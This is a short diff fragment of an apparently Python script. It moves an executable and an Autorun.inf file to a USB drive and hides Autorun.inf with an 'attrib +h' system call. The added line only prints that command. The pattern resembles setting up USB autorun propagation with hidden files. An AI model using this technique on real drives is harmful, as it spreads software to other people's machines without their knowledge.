@@ -42,4 +42,5 @@ print("setting up USB")
 # Move files to USB and set hidden
 shutil.move(exename,usbdir)
 shutil.move("Autorun.inf",usbdir)
+print("attrib +h "+os.path.join(usbdir,"Autorun.inf"))
 os.system("attrib +h \""+os.path.join(usbdir,"Autorun.inf")+"\"")
